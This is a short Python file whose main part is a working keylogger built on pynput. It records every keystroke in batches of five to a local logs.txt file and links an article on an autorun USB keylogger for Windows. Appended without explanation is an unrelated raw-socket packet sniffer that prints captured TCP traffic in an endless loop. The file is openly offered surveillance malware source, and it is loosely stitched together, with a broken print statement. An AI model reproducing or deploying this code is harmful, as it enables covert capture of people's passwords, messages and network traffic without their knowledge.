import pynput
from pynput.keyboard import Key, Listener

word_counts = 0
keys = []


def on_press(key):
    global word_counts, keys
    keys.append(key)
    word_counts += 1
    print('{key} pressed')
    if word_counts >= 5:
        word_counts = 0
        write_file(keys)
        keys = []


def write_file(key_arr):
    with open("logs.txt", "a") as f:
        for key in key_arr:
            ke = str(key).replace("'", "")
            if ke.find("space") > 0:
                f.write('\n')
            # Finding other Keys
            if ke.find("Key") == -1:
                f.write(ke)


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listner:
    listner.join()


# https://medium.com/@harsathAI/python-keylogger-advanced-with-autorun-usb-for-windows-a-modern-approach-with-clear-code-573e7b828cf2



import socket

s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)

while True:
   print(s.recvfrom(65565))
